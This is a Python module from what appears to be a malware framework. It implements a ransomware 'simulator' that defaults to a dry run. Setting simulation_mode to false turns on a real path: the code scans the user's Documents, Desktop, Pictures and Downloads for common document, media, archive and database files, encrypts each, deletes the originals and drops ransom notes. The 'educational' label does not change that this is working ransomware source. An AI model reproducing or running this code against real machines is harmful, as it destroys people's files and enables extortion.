#!/usr/bin/env python3
"""
Ransomware Simulator Module for Malware Framework
Provides file encryption capabilities for educational purposes
"""

import os
import sys
import time
import threading
from typing import Dict, Any, List, Optional, Set
import logging
from pathlib import Path
import json
import hashlib
import base64

from core.base_payload import BasePayload
from core.encryption import EncryptionManager
from core.utils import SystemUtils, FileUtils

logger = logging.getLogger(__name__)

class RansomwareSimulator(BasePayload):
    """Ransomware simulator payload implementation"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize ransomware simulator"""
        super().__init__(config)
        self.name = "Ransomware Simulator"
        self.description = "Educational ransomware simulator with file encryption"
        
        # Ransomware configuration
        self.target_directories = config.get('target_directories', [])
        self.target_extensions = config.get('target_extensions', [])
        self.exclude_directories = config.get('exclude_directories', [])
        self.exclude_extensions = config.get('exclude_extensions', [])
        self.max_file_size = config.get('max_file_size', 100 * 1024 * 1024)  # 100MB
        self.encrypt_extension = config.get('encrypt_extension', '.encrypted')
        self.ransom_note = config.get('ransom_note', '')
        self.simulation_mode = config.get('simulation_mode', True)
        
        # Encryption settings
        self.encryption = EncryptionManager(config.get('encryption', {}))
        self.key_file = config.get('key_file', 'decryption_key.json')
        
        # Ransomware state
        self.encrypted_files = []
        self.encryption_key = None
        self.total_files = 0
        self.encrypted_count = 0
        self.failed_count = 0
    
    def _initialize_payload(self) -> None:
        """Initialize ransomware specific components"""
        # Generate encryption key
        self.encryption_key = self._generate_encryption_key()
        
        # Setup target directories if not specified
        if not self.target_directories:
            self.target_directories = self._get_default_targets()
        
        # Setup target extensions if not specified
        if not self.target_extensions:
            self.target_extensions = self._get_default_extensions()
        
        # Setup exclude directories
        if not self.exclude_directories:
            self.exclude_directories = self._get_default_excludes()
        
        logger.info(f"Ransomware simulator initialized: {len(self.target_directories)} target directories")
    
    def _generate_encryption_key(self) -> str:
        """Generate encryption key for this session"""
        import secrets
        key = secrets.token_hex(32)  # 256-bit key
        return key
    
    def _get_default_targets(self) -> List[str]:
        """Get default target directories"""
        if SystemUtils.is_windows():
            return [
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Pictures"),
                os.path.expanduser("~/Downloads")
            ]
        else:
            return [
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Pictures"),
                os.path.expanduser("~/Downloads")
            ]
    
    def _get_default_extensions(self) -> List[str]:
        """Get default target file extensions"""
        return [
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
            '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.zip', '.rar',
            '.7z', '.tar', '.gz', '.sql', '.db', '.mdb'
        ]
    
    def _get_default_excludes(self) -> List[str]:
        """Get default exclude directories"""
        return [
            'System32', 'Windows', 'Program Files', 'Program Files (x86)',
            'AppData', 'Temp', 'tmp', '.git', '.svn', 'node_modules'
        ]
    
    def execute(self) -> bool:
        """Execute the ransomware simulator"""
        try:
            if self.simulation_mode:
                logger.info("Running in simulation mode - no files will be encrypted")
                return self._execute_simulation()
            else:
                logger.warning("Running in real mode - files will be encrypted!")
                return self._execute_encryption()
        
        except Exception as e:
            logger.error(f"Ransomware execution failed: {e}")
            return False
    
    def _execute_simulation(self) -> bool:
        """Execute ransomware simulation"""
        try:
            logger.info("Starting ransomware simulation...")
            
            # Scan for files
            target_files = self._scan_target_files()
            self.total_files = len(target_files)
            
            logger.info(f"Found {self.total_files} target files")
            
            # Simulate encryption
            for filepath in target_files:
                try:
                    # Simulate encryption delay
                    time.sleep(0.1)
                    
                    # Record file as "encrypted"
                    self.encrypted_files.append({
                        'path': str(filepath),
                        'size': filepath.stat().st_size,
                        'timestamp': time.time(),
                        'simulated': True
                    })
                    
                    self.encrypted_count += 1
                    
                    if self.encrypted_count % 10 == 0:
                        logger.info(f"Simulated encryption progress: {self.encrypted_count}/{self.total_files}")
                
                except Exception as e:
                    logger.error(f"Failed to simulate encryption of {filepath}: {e}")
                    self.failed_count += 1
            
            # Create ransom note
            self._create_ransom_note()
            
            # Save encryption key
            self._save_encryption_key()
            
            logger.info(f"Simulation completed: {self.encrypted_count} files processed")
            return True
        
        except Exception as e:
            logger.error(f"Simulation failed: {e}")
            return False
    
    def _execute_encryption(self) -> bool:
        """Execute real file encryption"""
        try:
            logger.warning("Starting real file encryption...")
            
            # Scan for files
            target_files = self._scan_target_files()
            self.total_files = len(target_files)
            
            logger.info(f"Found {self.total_files} target files")
            
            # Encrypt files
            for filepath in target_files:
                try:
                    if self._encrypt_file(filepath):
                        self.encrypted_count += 1
                        
                        if self.encrypted_count % 10 == 0:
                            logger.info(f"Encryption progress: {self.encrypted_count}/{self.total_files}")
                    else:
                        self.failed_count += 1
                
                except Exception as e:
                    logger.error(f"Failed to encrypt {filepath}: {e}")
                    self.failed_count += 1
            
            # Create ransom note
            self._create_ransom_note()
            
            # Save encryption key
            self._save_encryption_key()
            
            logger.info(f"Encryption completed: {self.encrypted_count} files encrypted")
            return True
        
        except Exception as e:
            logger.error(f"Encryption failed: {e}")
            return False
    
    def _scan_target_files(self) -> List[Path]:
        """Scan for target files"""
        target_files = []
        
        for directory in self.target_directories:
            dir_path = Path(directory)
            if not dir_path.exists():
                logger.warning(f"Target directory does not exist: {directory}")
                continue
            
            try:
                for filepath in dir_path.rglob('*'):
                    if filepath.is_file() and self._should_encrypt_file(filepath):
                        target_files.append(filepath)
            except Exception as e:
                logger.error(f"Error scanning directory {directory}: {e}")
        
        return target_files
    
    def _should_encrypt_file(self, filepath: Path) -> bool:
        """Check if file should be encrypted"""
        try:
            # Check file size
            if filepath.stat().st_size > self.max_file_size:
                return False
            
            # Check file extension
            if self.target_extensions and filepath.suffix.lower() not in self.target_extensions:
                return False
            
            # Check exclude extensions
            if self.exclude_extensions and filepath.suffix.lower() in self.exclude_extensions:
                return False
            
            # Check if file is already encrypted
            if filepath.suffix == self.encrypt_extension:
                return False
            
            # Check exclude directories
            for exclude_dir in self.exclude_directories:
                if exclude_dir.lower() in str(filepath).lower():
                    return False
            
            return True
        
        except Exception as e:
            logger.error(f"Error checking file {filepath}: {e}")
            return False
    
    def _encrypt_file(self, filepath: Path) -> bool:
        """Encrypt a single file"""
        try:
            # Read file
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Encrypt data
            encrypted_data = self.encryption.encrypt(data)
            
            # Create encrypted file path
            encrypted_path = filepath.with_suffix(filepath.suffix + self.encrypt_extension)
            
            # Write encrypted file
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            filepath.unlink()
            
            # Record encrypted file
            self.encrypted_files.append({
                'path': str(encrypted_path),
                'original_path': str(filepath),
                'size': len(data),
                'encrypted_size': len(encrypted_data),
                'timestamp': time.time(),
                'simulated': False
            })
            
            return True
        
        except Exception as e:
            logger.error(f"Failed to encrypt file {filepath}: {e}")
            return False
    
    def _create_ransom_note(self) -> bool:
        """Create ransom note"""
        try:
            if not self.ransom_note:
                self.ransom_note = self._get_default_ransom_note()
            
            # Create ransom note in target directories
            for directory in self.target_directories:
                dir_path = Path(directory)
                if dir_path.exists():
                    note_path = dir_path / "RANSOM_NOTE.txt"
                    
                    with open(note_path, 'w', encoding='utf-8') as f:
                        f.write(self.ransom_note)
            
            logger.info("Ransom notes created")
            return True
        
        except Exception as e:
            logger.error(f"Failed to create ransom note: {e}")
            return False
    
    def _get_default_ransom_note(self) -> str:
        """Get default ransom note"""
        return f"""
⚠️  WARNING: YOUR FILES HAVE BEEN ENCRYPTED ⚠️

This is a SIMULATION for educational purposes only.
No real files have been encrypted.

If this were real ransomware:
- Your files would be encrypted with AES-256
- You would need the decryption key to recover them
- The attacker would demand payment for the key

For this simulation:
- Files were processed but not actually encrypted
- A decryption key has been saved to: {self.key_file}
- You can use the decryptor to restore files

Total files processed: {self.encrypted_count}
Simulation completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}

⚠️  THIS IS ONLY A SIMULATION - NO REAL ENCRYPTION OCCURRED ⚠️
"""
    
    def _save_encryption_key(self) -> bool:
        """Save encryption key for decryption"""
        try:
            key_data = {
                'encryption_key': self.encryption_key,
                'algorithm': self.encryption.algorithm,
                'encrypted_files': self.encrypted_files,
                'timestamp': time.time(),
                'simulation_mode': self.simulation_mode
            }
            
            # Save to build directory
            build_dir = Path("build")
            build_dir.mkdir(exist_ok=True)
            
            key_path = build_dir / self.key_file
            FileUtils.write_json(key_data, key_path)
            
            logger.info(f"Encryption key saved to: {key_path}")
            return True
        
        except Exception as e:
            logger.error(f"Failed to save encryption key: {e}")
            return False
    
    def decrypt_files(self, key_file: Optional[str] = None) -> bool:
        """Decrypt files using saved key"""
        try:
            if key_file is None:
                key_file = f"build/{self.key_file}"
            
            key_path = Path(key_file)
            if not key_path.exists():
                logger.error(f"Key file not found: {key_path}")
                return False
            
            # Load key data
            key_data = FileUtils.read_json(key_path)
            if not key_data:
                return False
            
            # Decrypt files
            decrypted_count = 0
            for file_info in key_data.get('encrypted_files', []):
                try:
                    encrypted_path = Path(file_info['path'])
                    if encrypted_path.exists():
                        if self._decrypt_file(encrypted_path, key_data['encryption_key']):
                            decrypted_count += 1
                
                except Exception as e:
                    logger.error(f"Failed to decrypt {file_info['path']}: {e}")
            
            logger.info(f"Decryption completed: {decrypted_count} files decrypted")
            return True
        
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return False
    
    def _decrypt_file(self, encrypted_path: Path, key: str) -> bool:
        """Decrypt a single file"""
        try:
            # Read encrypted file
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            # Decrypt data
            decrypted_data = self.encryption.decrypt(encrypted_data)
            
            # Create original file path
            original_path = encrypted_path.with_suffix('')
            if original_path.suffix.endswith(self.encrypt_extension):
                original_path = original_path.with_suffix(original_path.suffix[:-len(self.encrypt_extension)])
            
            # Write decrypted file
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # Remove encrypted file
            encrypted_path.unlink()
            
            return True
        
        except Exception as e:
            logger.error(f"Failed to decrypt file {encrypted_path}: {e}")
            return False
    
    def get_encryption_stats(self) -> Dict[str, Any]:
        """Get encryption statistics"""
        return {
            'total_files': self.total_files,
            'encrypted_count': self.encrypted_count,
            'failed_count': self.failed_count,
            'success_rate': (self.encrypted_count / self.total_files * 100) if self.total_files > 0 else 0,
            'simulation_mode': self.simulation_mode,
            'target_directories': self.target_directories,
            'target_extensions': self.target_extensions
        }
    
    def _cleanup(self) -> None:
        """Cleanup ransomware resources"""
        try:
            # Remove ransom notes
            for directory in self.target_directories:
                dir_path = Path(directory)
                if dir_path.exists():
                    note_path = dir_path / "RANSOM_NOTE.txt"
                    if note_path.exists():
                        note_path.unlink()
            
            logger.info("Ransomware cleanup completed")
        
        except Exception as e:
            logger.error(f"Ransomware cleanup failed: {e}")
    
    def get_status(self) -> Dict[str, Any]:
        """Get ransomware status"""
        status = super().get_status()
        status.update({
            'simulation_mode': self.simulation_mode,
            'total_files': self.total_files,
            'encrypted_count': self.encrypted_count,
            'failed_count': self.failed_count,
            'target_directories': self.target_directories,
            'target_extensions': self.target_extensions
        })
        return status 